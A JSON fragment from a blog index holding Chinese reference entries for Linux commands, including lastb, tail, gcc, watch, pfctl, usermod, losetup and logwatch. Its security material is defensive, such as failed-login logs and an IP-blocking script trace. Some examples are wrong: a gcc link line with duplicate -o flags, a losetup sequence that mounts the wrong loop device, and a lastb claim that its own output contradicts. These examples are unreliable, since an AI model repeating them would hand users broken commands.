","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"smbclient","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/smbclient/","stats":{"text":"3 min read","time":147000,"words":604,"minutes":3},"date":"2022-02-02 14:29:42","dateFormat":"2022-02-02"},{"content":"列出登入系统失败的用户相关信息。 补充说明 lastb 命令用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行 lastb 命令，它会读取位于/var/log目录下，名称为 btmp 的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。 语法 lastb (选项) (参数) 选项 -a：把从何处登入系统的主机名称或 ip 地址显示在最后一行； -d：将 IP 地址转换成主机名称； -f&lt;记录文件&gt;：指定记录文件； -n&lt;显示列数&gt;或-&lt;显示列数&gt;：设置列出名单的显示列数； -R：不显示登入系统的主机名称或 IP 地址； -x：显示系统关机，重新开机，以及执行等级的改变等信息。 参数 用户名：显示中的用户的登录列表； 终端：显示从指定终端的登录列表。 实例 首次运行 lastb 命令会报下的错误： lastb: /var/log/btmp: No such file or directory Perhaps this file was removed by the operator to prevent logging lastb info. 只需建立这个不存在的文件即可。 touch /var/log/btmp 使用 ssh 的登录失败不会记录在 btmp 文件中。 lastb | head root ssh:notty 110.84.129.3 Tue Dec 17 06:19 - 06:19 (00:00) root ssh:notty 110.84.129.3 Tue Dec 17 04:05 - 04:05 (00:00) root ssh:notty 110.84.129.3 Tue Dec 17 01:52 - 01:52 (00:00) root ssh:notty 110.84.129.3 Mon Dec 16 23:38 - 23:38 (00:00) leonob ssh:notty 222.211.85.18 Mon Dec 16 22:18 - 22:18 (00:00) leonob ssh:notty 222.211.85.18 Mon Dec 16 22:18 - 22:18 (00:00) root ssh:notty 110.84.129.3 Mon Dec 16 21:25 - 21:25 (00:00) root ssh:notty 110.84.129.3 Mon Dec 16 19:12 - 19:12 (00:00) root ssh:notty 110.84.129.3 Mon Dec 16 17:00 - 17:00 (00:00) admin ssh:notty 129.171.193.99 Mon Dec 16 16:52 - 16:52 (00:00) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lastb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lastb/","stats":{"text":"3 min read","time":134000,"words":487,"minutes":3},"date":"2022-02-02 14:29:10","dateFormat":"2022-02-02"},{"content":"在屏幕上显示指定文件的末尾若干行。 补充说明 tail 命令用于输入文件中的尾部内容。tail 命令默认在屏幕上显示指定文件的末尾 10 行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。 注意：如果表示字节或行数的 N 值之前有一个”+”号，则从文件开头的第 N 项开始显示，而不是显示文件的最后 N 项。N 值后面可以有后缀：b 表示 512，k 表示 1024，m 表示 1 048576(1M)。 语法 tail (选项) (参数) 选项 --retry：即是在tail命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“——follow=name”连用； -c&lt;N&gt;或——bytes=&lt;N&gt;：输出文件尾部的N（N为整数）个字节内容； -f&lt;name/descriptor&gt;或；--follow&lt;nameldescript&gt;：显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。“-f”与“-fdescriptor”等效； -F：与选项“-follow=name”和“--retry&quot;连用时功能相同； -n&lt;N&gt;或——line=&lt;N&gt;：输出文件的尾部N（N位数字）行内容。 --pid=&lt;进程号&gt;：与“-f”选项连用，当指定的进程号的进程终止后，自动退出tail命令； -q或——quiet或——silent：当有多个文件参数时，不输出各个文件名； -s&lt;秒数&gt;或——sleep-interal=&lt;秒数&gt;：与“-f”选项连用，指定监视文件变化时间隔的秒数； -v或——verbose：当有多个文件参数时，总是输出各个文件名； --help：显示指令的帮助信息； --version：显示指令的版本信息。 参数 文件列表：指定要显示尾部内容的文件列表。 实例 tail file #（显示文件file的最后10行） tail -n +20 file #（显示文件file的内容，从第20行至文件末尾） tail -c 10 file #（显示文件file的最后10个字符） tail -25 mail.log # 显示 mail.log 最后的 25 行 tail -f mail.log # 等同于--follow=descriptor，根据文件描述符进行追踪，当文件改名或被删除，追踪停止 tail -F mail.log # 等同于--follow=name --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tail","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tail/","stats":{"text":"3 min read","time":147000,"words":639,"minutes":3},"date":"2022-02-02 14:28:42","dateFormat":"2022-02-02"},{"content":"基于 C/C++的编译器。 补充说明 gcc 命令使用 GNU 推出的基于 C/C++的编译器，是开放源代码领域应用最广泛的编译器，具有功能强大，编译代码支持性能优化等特点。现在很多程序员都应用 GCC，怎样才能更好的应用 GCC。目前，GCC 可以用来编译 C/C++、FORTRAN、JAVA、OBJC、ADA 等语言的程序，可根据需要选择安装支持的语言。 语法 gcc (选项) (参数) 选项 -o：指定生成的输出文件； -E：仅执行编译预处理； -S：将 C 代码转换为汇编代码； -wall：显示警告信息； -c：仅执行编译操作，不进行连接操作。 参数 C 源文件：指定 C 语言源代码文件。 实例 常用编译命令选项 假设源程序文件名为 test.c 无选项编译链接 gcc test.c 将 test.c 预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为 a.out。 选项 -o gcc test.c -o test 将 test.c 预处理、汇编、编译并链接形成可执行文件 test。-o 选项用来指定输出文件的文件名。 选项 -E gcc -E test.c -o test.i 将 test.c 预处理输出 test.i 文件。 选项 -S gcc -S test.i 将预处理输出文件 test.i 汇编成 test.s 文件。 选项 -c gcc -c test.s 将汇编输出文件 test.s 编译输出 test.o 文件。 无选项链接 gcc test.o -o test 将编译输出文件 test.o 链接成最终可执行文件 test。 选项 -O gcc -O1 test.c -o test 使用编译优化级别 1 编译程序。级别为 1~3，级别越大优化效果越好，但编译时间越长。 多源文件的编译方法 如果有多个源文件，基本上有两种编译方法： 假设有两个源文件为 test.c 和 testfun.c 多个文件一起编译 gcc testfun.c test.c -o test 将 testfun.c 和 test.c 分别编译后链接成 test 可执行文件。 分别编译各个源文件，之后对编译后输出的目标文件链接。 gcc -c testfun.c #将testfun.c编译成testfun.o gcc -c test.c #将test.c编译成test.o gcc -o testfun.o test.o -o test #将testfun.o和test.o链接成test 以上两种方法相比较，第一中方法编译时需要所有文件重新编译，而第二种方法可以只重新编译修改的文件，未修改的文件不用重新编译。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gcc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gcc/","stats":{"text":"3 min read","time":152000,"words":649,"minutes":3},"date":"2022-02-02 14:27:10","dateFormat":"2022-02-02"},{"content":"可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令。 补充说明 watch 命令以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch 是一个非常实用的命令，基本所有的 Linux 发行版都带有这个小工具，如同名字一样，watch 可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。 语法 watch (选项) (参数) 选项 -n # 或--interval watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。 -d # 或--differences 用-d或--differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。 -t # 或-no-title 会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。 -h, --help # 查看帮助文档 参数 指令：需要周期性执行的指令。 实例 watch -n 1 -d netstat -ant # 命令：每隔一秒高亮显示网络链接数的变化情况 watch -n 1 -d 'pstree|grep http' # 每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加''将命令区域归整。 watch 'netstat -an | grep:21 | \\ grep&lt;模拟攻击客户机的IP&gt;| wc -l' # 实时查看模拟攻击客户机建立起来的连接数 watch -d 'ls -l|grep scf' # 监测当前目录中 scf' 的文件的变化 watch -n 10 'cat /proc/loadavg' # 10秒一次输出系统的平均负载 watch uptime watch -t uptime watch -d -n 1 netstat -ntlp watch -d 'ls -l | fgrep goface' # 监测goface的文件 watch -t -differences=cumulative uptime watch -n 60 from # 监控mail watch -n 1 &quot;df -i;df&quot; # 监测磁盘inode和block数目变化情况 FreeBSD 和 Linux 下 watch 命令的不同，在 Linux 下，watch 是周期性的执行下个程序，并全屏显示执行结果，如：watch -n 1 -d netstat -ant，而在 FreeBSD 下的 watch 命令是查看其它用户的正在运行的操作，watch 允许你偷看其它 terminal 正在做什么，该命令只能让超级用户使用。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"watch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/watch/","stats":{"text":"3 min read","time":132000,"words":562,"minutes":3},"date":"2022-02-02 14:26:30","dateFormat":"2022-02-02"},{"content":"PF 防火墙的配置命令。 补充说明 pfctl 命令是 PF 防火墙的配置命令，PF 防火墙 ( 全称：Packet Filter ) 是 UNIX LIKE 系统上进行 TCP/ip 流量过滤和网络地址转换的软件系统。PF 同样也能提供 TCP/IP 流量的整形和控制，并且提供带宽控制和数据包优先集控制。PF 最早是由 Daniel Hartmeier 开发的，现在的开发和维护由 Daniel 和 openBSD 小组的其他成员负责。 PF 防火墙的功能很多，本站只列举一些基本配置。 激活 要激活 pf 并且使它在启动时调用配置文件，编辑/etc/rc.conf文件，修改配置 pf 的一行： pf=yes 重启操作系统让配置生效。 也可以通过 pfctl 程序启动和停止 pf： pfctl -e pfctl -d 注意这仅仅是启动和关闭 PF，实际它不会载入规则集，规则集要么在系统启动时载入，要在 PF 启动后通过命令单独载入。 配置 系统引导到在 rc 脚本文件运行 PF 时 PF 从/etc/pf.conf文件载入配置规则。注意当/etc/pf.conf文件是默认配置文件，在系统调用 rc 脚本文件时，它仅仅是作为文本文件由 pfctl 装入并解释和插入 pf 的。对于一些应用来说，其他的规则集可以在系统引导后由其他文件载入。对于一些设计的非常好的 unix 程序，PF 提供了足够的灵活性。 pf.conf 文件有 7 个部分： 宏：用户定义的变量，包括 IP 地址，接口名称等等。 表：一种用来保存 IP 地址列表的结构。 选项：控制 PF 如何工作的变量。 整形：重新处理数据包，进行正常化和碎片整理。 排队：提供带宽控制和数据包优先级控制。 转换：控制网络地址转换和数据包重定向。 过滤规则：在数据包通过接口时允许进行选择性的过滤和阻止。 除去宏和表，其他的段在配置文件中也应该按照这个顺序出现，尽管对于一些特定的应用并不是所有的段都是必须的。 空行会被忽略，以#开头的行被认为是注释。 控制 引导之后，PF 可以通过 pfctl 程序进行操作，以下是一些例子： pfctl -f /etc/pf.conf # 载入 pf.conf 文件 pfctl -nf /etc/pf.conf # 解析文件，但不载入 pfctl -Nf /etc/pf.conf # 只载入文件中的NAT规则 pfctl -Rf /etc/pf.conf # 只载入文件中的过滤规则 pfctl -sn # 显示当前的NAT规则 pfctl -sr # 显示当前的过滤规则 pfctl -ss # 显示当前的状态表 pfctl -si # 显示过滤状态和计数 pfctl -sa # 显示任何可显示的 完整的命令列表，请参阅 pfctl 的 man 手册页。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pfctl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pfctl/","stats":{"text":"3 min read","time":163000,"words":739,"minutes":3},"date":"2022-02-02 14:25:53","dateFormat":"2022-02-02"},{"content":"监视系统输入输出设备和 CPU 的使用情况。 补充说明 iostat 命令被用于监视系统输入输出设备和 CPU 的使用情况。它的特点是汇报磁盘活动统计情况，同时也会汇报出 CPU 使用情况。同 vmstat 一样，iostat 也有一个弱点，就是它不能对某个进程进行深入分析，仅对系统的整体情况进行分析。 语法 iostat (选项) (参数) 选项 -c：仅显示 CPU 使用情况； -d：仅显示设备利用率； -k：显示状态以千字节每秒为单位，而不使用块每秒； -m：显示状态以兆字节每秒为单位； -p：仅显示块设备和所有被使用的其他分区的状态； -t：显示每个报告产生时的时间； -V：显示版号并退出； -x：显示扩展状态。 参数 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 实例 用iostat -x /dev/sda1来观看磁盘 I/O 的详细情况： iostat -x /dev/sda1 Linux 2.6.18-164.el5xen (localhost.localdomain) 2010年03月26日 avg-cpu: %user %nice %system %iowait %steal %idle 0.11 0.02 0.18 0.35 0.03 99.31 Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtn sda1 0.02 0.08 0.00 2014 4 详细说明：第二行是系统信息和监测时间，第三行和第四行显示 CPU 使用情况（具体内容和 mpstat 命令相同）。这里主要关注后面 I/O 输出的信息，如下所示： 标示 说明 Device 监测设备名称 rrqm/s 每秒需要读取需求的数量 wrqm/s 每秒需要写入需求的数量 r/s 每秒实际读取需求的数量 w/s 每秒实际写入需求的数量 rsec/s 每秒读取区段的数量 wsec/s 每秒写入区段的数量 rkB/s 每秒实际读取的大小，单位为KB wkB/s 每秒实际写入的大小，单位为KB avgrq-sz 需求的平均大小区段 avgqu-sz 需求的平均队列长度 await 等待I/O平均的时间（milliseconds） svctm I/O需求完成的平均时间 %util 被I/O需求消耗的CPU百分比 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iostat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iostat/","stats":{"text":"3 min read","time":129000,"words":551,"minutes":3},"date":"2022-02-02 14:24:18","dateFormat":"2022-02-02"},{"content":"显示或忽略重复的行。。 概要 uniq [OPTION]... [INPUT [OUTPUT]] 主要用途 将输入文件（或标准输入）中邻近的重复行写入到输出文件（或标准输出）中。 当没有选项时，邻近的重复行将合并为一个。 选项 -c, --count 在每行开头增加重复次数。 -d, --repeated 所有邻近的重复行只被打印一次。 -D 所有邻近的重复行将全部打印。 --all-repeated[=METHOD] 类似于 -D，但允许每组之间以空行分割。METHOD取值范围{none(默认)，prepend，separate}。 -f, --skip-fields=N 跳过对前N个列的比较。 --group[=METHOD] 显示所有行，允许每组之间以空行分割。METHOD取值范围：{separate(默认)，prepend，append，both}。 -i, --ignore-case 忽略大小写的差异。 -s, --skip-chars=N 跳过对前N个字符的比较。 -u, --unique 只打印非邻近的重复行。 -z, --zero-terminated 设置行终止符为NUL（空），而不是换行符。 -w, --check-chars=N 只对每行前N个字符进行比较。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 INPUT（可选）：输入文件，不提供时为标准输入。 OUTPUT（可选）：输出文件，不提供时为标准输出。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 注意：命令 2 和命令 3 结果一样，命令 1 仅作了相邻行的去重。 uniq file.txt sort file.txt | uniq sort -u file.txt 只显示单一行，区别在于是否执行排序： uniq -u file.txt sort file.txt | uniq -u 统计各行在文件中出现的次数： sort file.txt | uniq -c 在文件中找出重复的行： sort file.txt | uniq -d 注意 uniq只检测邻近的行是否重复，sort -u将输入文件先排序然后再处理重复行。 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 uniq，info coreutils 'uniq invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uniq","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uniq/","stats":{"text":"2 min read","time":114000,"words":487,"minutes":2},"date":"2022-02-02 14:23:30","dateFormat":"2022-02-02"},{"content":"用于修改用户的基本信息。 补充说明 usermod 命令用于修改用户的基本信息。usermod 命令不允许你改变正在线上的使用者帐号名称。当 usermod 命令用来改变 user id，必须确认这名 user 没在电脑上执行任何程序。你需手动更改使用者的 crontab 档。也需手动更改使用者的 at 工作档。采用 NIS server 须在 server 上更动相关的 NIS 设定。 语法 usermod (选项) (参数) 选项 -c&lt;备注&gt;：修改用户帐号的备注文字； -d&lt;登入目录&gt;：修改用户登入时的目录，只是修改/etc/passwd中用户的家目录配置信息，不会自动创建新的家目录，通常和-m一起使用； -m&lt;移动用户家目录&gt;:移动用户家目录到新的位置，不能单独使用，一般与-d一起使用。 -e&lt;有效期限&gt;：修改帐号的有效期限； -f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号； -g&lt;群组&gt;：修改用户所属的群组； -G&lt;群组&gt;；修改用户所属的附加群组； -l&lt;帐号名称&gt;：修改用户帐号名称； -L：锁定用户密码，使密码无效； -s&lt;shell&gt;：修改用户登入后所使用的shell； -u&lt;uid&gt;：修改用户ID； -U:解除密码锁定。 参数 登录名：指定要修改信息的用户登录名。 实例 将 newuser2 添加到组 staff 中： usermod -G staff newuser2 修改 newuser 的用户名为 newuser1： usermod -l newuser1 newuser 锁定账号 newuser1： usermod -L newuser1 解除对 newuser1 的锁定： usermod -U newuser1 增加用户到用户组中: apk add shadow # 安装 shadow 包, usermod 命令包含在 usermod 中 usermod -aG group user # 添加用户到用户组中 -a 参数表示附加，只和 -G 参数一同使用，表示将用户增加到组中。 修改用户家目录： [root@node-1 ~]# useradd lutixiaya [root@node-1 ~]# ls /home lutixiaya [root@node-1 ~]# usermod -md /data/new_home lutixiaya [root@node-1 ~]# ls /home/ [root@node-1 ~]# ls /data/ new_home ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"usermod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/usermod/","stats":{"text":"3 min read","time":125000,"words":526,"minutes":3},"date":"2022-02-02 14:22:29","dateFormat":"2022-02-02"},{"content":"设定与控制循环（loop）设备。 补充说明 losetup 命令用来设置循环设备。循环设备可把文件虚拟成块设备，籍此来模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。 语法 losetup [ -e encryption ] [ -o offset ] loop_device filelosetup [ -d ] loop_device 选项 -a 显示所有循环设备的状态。 -d 卸除设备。 -e &lt;加密选项&gt; 启动加密编码 。 -f 寻找第一个未使用的循环设备。 -o &lt;偏移量&gt;设置数据偏移量，单位是字节。 参数 loop_device：循环设备可以是/dev/loop0, /dev/loop1 ... /dev/loop7。 file：要与循环设备相关联的文件名，这个往往是一个磁盘镜象文件，如 *.img loop 设备介绍 在类 UNIX 系统里，loop 设备是一种伪设备 (pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。 上面说的文件格式，我们经常见到的是 cd 或 DVD 的 ISO 光盘镜像文件或者是软盘 (硬盘) 的 *.img 镜像文件。通过这种 loop mount (回环 mount) 的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。 至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上； 而对于这种被 mount 起来的镜像文件 (它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。 实例 创建空的磁盘镜像文件，这里创建一个 1.44M 的软盘： dd if=/dev/zero of=floppy.img bs=512 count=2880 使用 losetup 将磁盘镜像文件虚拟成快设备： losetup /dev/loop1 floppy.img 挂载块设备： mount /dev/loop0 /tmp 经过上面的三步之后，我们就可以通过/tmp 目录，像访问真实快设备一样来访问磁盘镜像文件 floppy.img。 卸载 loop 设备： umount /tmp losetup -d /dev/loop1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"losetup","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/losetup/","stats":{"text":"3 min read","time":142000,"words":643,"minutes":3},"date":"2022-02-02 14:21:58","dateFormat":"2022-02-02"},{"content":"shell 命令解释器。 补充说明 sh 命令是 shell 命令语言解释器，执行命令从标准输入读取或从一个文件中读取。通过用户输入命令，和内核进行沟通！Bourne Again Shell （即 bash）是自由软件基金会（GNU）开发的一个 Shell，它是 Linux 系统中一个默认的 Shell。Bash 不但与 Bourne Shell 兼容，还继承了 C Shell、Korn Shell 等优点。 语法 bash [options] [file] 选项 -c string：命令从-c后的字符串读取。 -i：实现脚本交互。 -n：进行shell脚本的语法检查。 -x：实现shell脚本逐条语句的跟踪。 实例 使用-x 选项跟踪脚本调试 shell 脚本，能打印出所执行的每一行命令以及当前状态： [root@AY1307311912260196fcZ satools]# sh -x check_ssh_login.sh + DEFINE=30 + cat /var/log/secure + awk '/Failed/ {++ip[$(NF-3)]} END {for (i in ip) print i&quot;=&quot;ip[i]}' ++ cat /root/satools/black.txt + for i in '`cat /root/satools/black.txt`' ++ echo 121.42.0.16=1427 ++ awk -F= '{print $1}' + IP=121.42.0.16 ++ echo 121.42.0.16=1427 ++ awk -F= '{print $2}' + NUM=1427 + '[' 1427 -gt 30 ']' + grep 121.42.0.16 /etc/hosts.deny + '[' 1 -gt 0 ']' + echo sshd:121.42.0.16 + echo vsftpd:121.42.0.16 + for i in '`cat /root/satools/black.txt`' ++ echo 121.42.0.72=276 ++ awk -F= '{print $1}' + IP=121.42.0.72 ++ awk -F= '{print $2}' ++ echo 121.42.0.72=276 + NUM=276 + '[' 276 -gt 30 ']' + grep 121.42.0.72 /etc/hosts.deny + '[' 1 -gt 0 ']' + echo sshd:121.42.0.72 + echo vsftpd:121.42.0.72 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sh","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sh/","stats":{"text":"2 min read","time":102000,"words":350,"minutes":2},"date":"2022-02-02 14:21:30","dateFormat":"2022-02-02"},{"content":"UUCP 文件传输服务程序。 补充说明 uucico 命令命令 UUCP 文件传输服务程序。 uucico 是用来处理 uucp 或 uux 送到队列的文件传输工具。uucico 有两种工作模式：主动模式和附属模式。当在主动模式下时，uucico 会调用远端主机； 在附属模式下时，uucico 则接受远端主机的调用。 语法 uucico [-cCDefqvwz][-i&lt;类型&gt;][-I&lt;文件&gt;][-p&lt;连接端口号码&gt;][-][-rl][-s&lt;主机&gt;][-S&lt;主机&gt;][-u&lt;用户&gt;][-x&lt;类型&gt;][--help] 选项 -c或--quiet 当不执行任何工作时，不要更改记录文件的内容及更新目前的状态。 -C或--ifwork 当有工作要执行时，才调用-s或-S参数所指定主机。 -D或--nodetach 不要与控制终端机离线。 -e或--loop 在附属模式下执行，并且出现要求登入的提示画面。 -f或--force 当执行错误时，不等待任何时间即重新调用主机。 -i&lt;类型&gt;或--stdin&lt;类型&gt; 当使用到标准输入设备时，指定连接端口的类型。 -I&lt;文件&gt;--config&lt;文件&gt; 指定使用的配置文件。 -l或--prompt 出现要求登入的提示画面。 -p&lt;连接端口号码&gt;或-port&lt;连接端口号码&gt; 指定连接端口号码。 -q或--quiet 不要启动uuxqt服务程序。 -r0或--slave 以附属模式启动。 -s&lt;主机&gt;或--system&lt;主机&gt; 调用指定的主机。 -u&lt;用户&gt;或--login&lt;用户&gt; 指定登入的用户帐号，而不允许输入任意的登入帐号。 -v或--version 显示版本信息，并且结束程序。 -w或--wait 在主动模式下，当执行调用动作时，则出现要求登入的提示画面。 -x&lt;类型&gt;或-X&lt;类型&gt;或outgoing-debug&lt;类型&gt; 启动指定的排错模式。 -z或--try-next 当执行不成功时，尝试下一个选择而不结束程序。 --help 显示帮助，并且结束程序。 实例 使用主动模式启动 uucico 服务。在命令提示符下直接输入如下命令： uucico-r1 提示：该命令一般没有输出。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uucico","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uucico/","stats":{"text":"3 min read","time":132000,"words":571,"minutes":3},"date":"2022-02-02 14:21:08","dateFormat":"2022-02-02"},{"content":"该命令是 bash 内建命令，用于显示 bash 内建命令的帮助信息。。 补充说明 help 命令 help 命令只能显示 bash 内建命令的帮助信息，而对于外部命令的帮助信息只能使用 man 或者 info 命令查看。 语法 help (选项) (参数) 选项 -d：显示内建命令的简要描述。 -m：按照man手册的格式输出内建命令的帮助信息。 -s：仅输出内建命令的命令格式。 不指定选项时：输出的帮助信息类似于-m选项，但是缺少段落名称和'SEE ALSO'，'IMPLEMENTATION'部分。 参数 bash 内建命令（可以为多个，请用空格分隔开）。 常见问题 Q：有哪些命令是bash内建命令？我如何判断一个命令是否为bash内建命令？ A：您可以在终端使用 'man builtin' 或 'man builtins' 来获取；您可以查看bash内建命令 'type' 的帮助信息。 Q：那么help命令本身的帮助信息如何获取？ A：把help作为参数传给help命令； Q：为什么echo也可以用 'man echo' 来查看帮助信息？ A：因为除了bash内建的echo，GNU/linux的coreutils包里也有该命令；在echo的man手册中，DESCRIPTION段落的 'NOTE' 也提示了和同名内建的不同。 PS：当你在shell脚本里定义了一个叫 'echo' 的函数，那么调用的时候优先级会如何呢？ 请参考 'builtin' 命令 Q：我需要获得更多的bash的相关帮助信息 A：限于篇幅和主题，您可以在终端执行 'man bash' ， 'info bash' 等。 实例 使用 help 命令显示 shell 内部 shopt 命令的帮助信息，输入如下命令： help shopt #获取shopt命令的帮助信息 shopt: shopt [-pqsu] [-o long-option] optname [optname...] Toggle the values of variables controlling optional behavior. The -s flag means to enable (set) each OPTNAME; the -u flag unsets each OPTNAME. The -q flag suppresses output; the exit status indicates whether each OPTNAME is set or unset. The -o option restricts the OPTNAMEs to those defined for use with `set -o'. With no options, or with the -p option, a list of all settable options is displayed, with an indication of whether or not each is set. ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"help","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/help/","stats":{"text":"3 min read","time":131000,"words":532,"minutes":3},"date":"2022-02-02 14:18:44","dateFormat":"2022-02-02"},{"content":"地址配置工具。 补充说明 nmcli 命令是 NetworkManager client 网络管理客户端。 语法 nmcli [OPTIONS] OBJECT { COMMAND | help } 选项 OPTIONS -t[erse] # terse output 简洁的输出 -p[retty] # pretty output 漂亮的输出 -m[ode] tabular|multiline # output mode 输出模式 -f[ields] &lt;field1,field2,...&gt;|all|common # specify fields to output 指定要输出的字段 -e[scape] yes|no # escape columns separators in values 在值中转义列分隔符 -n[ocheck] # 不要检查nmcli和NetworkManager版本 -a[sk] # 要求缺少参数 -w[ait] &lt;seconds&gt; # 设置超时等待整理操作 -v[ersion] # 显示程序版本 -h[elp] # 打印此帮助 OBJECT g[eneral] NetworkManager的一般状态和操作 n[etworking] 整体组网控制 r[adio] NetworkManager切换开关 c[onnection] NetworkManager的连接 d[evice] 由NetworkManager管理的设备 a[gent] NetworkManager秘密代理或polkit代理 实例 nmcli connection show # 查看当前连接状态 nmcli connection reload # 重启服务 nmcli connection show -active # 显示活动的连接 nmcli connection show &quot;lan eth0&quot;# 显示指定一个网络连接配置 nmcli device status # 显示设备状态 nmcli device show eno16777736 # 显示指定接口属性 nmcli device show # 显示全部接口属性 nmcli con up static # 启用static连接配置 nmcli con up default # 启用default连接配置 nmcli con add help # 查看帮助 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nmcli","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nmcli/","stats":{"text":"2 min read","time":82000,"words":311,"minutes":2},"date":"2022-02-02 14:18:25","dateFormat":"2022-02-02"},{"content":"可定制和可插入式的日志监视系统。 补充说明 logwatch 命令是一个可定制和可插入式的日志监视系统，它通过遍历给定时间范围内的系统日志文件而产生日志报告。logwatch 默认每天执行一次，可以从/etc/cron.daily里看到。 语法 logwatch (选项) 选项 --detail&lt;报告详细程度&gt;：指定日志报告的详细程度； --logfile&lt;日志文件&gt;：仅处理指定的日志文件； --service&lt;服务名&gt;：仅处理指定服务的日志文件； --print：打印结果到标准输出； --mailto&lt;邮件地址&gt;：将结果发送到指定邮箱； --range&lt;日期范围&gt;：指定处理日志的日期范围； --archives：处理归档日志文件； --debug&lt;调试等级&gt;：调试模式； --save&lt;文件名&gt;：将结果保存到指定文件中，而不显示或者发送到指定邮箱； --logdir&lt;目录&gt;：指定查找日志文件的目录，而不使用默认的日志目录； --hostname&lt;主机名&gt;：指定在日志报告中使用的主机名，不使用系统默认的主机名； --numeric：在报告中显示 ip 地址而不是主机名； --help：显示指令的帮助信息。 实例 检查你的主机上是否已经存在 Logwatch（Redhat 默认已经安装了 Logwatch，不过版本比较旧）： rpm -qa logwatch 如果主机上没有 logwatch，则执行： rpm -Ivh logwatch***.rpm 如果有老版本的 logwatch，则执行： rpm -Uvh logwatch***.rpm 安装完毕后，开始配置： 可以修改和添加它的 logfiles、services 和其他配置，但默认已经有很多脚本了，只要在 1）里设置Detail = High就可以了。 可以添加新的配置到/etc/logwatch/conf/logwatch.conf 也可以修改/usr/share/logwatch/default.conf/logwatch.conf /etc/logwatch/conf/会自动覆盖/usr/share/logwatch/default.conf/下的同名文件。 如果没有设置 logwatch.conf 也没关系，可以直接在命令行下设置。 logwatch --detail High --Service All --range All --print 基本就可以显示出所有日志的情况了 logwatch --service sshd --detail High 只看 sshd 的日志情况 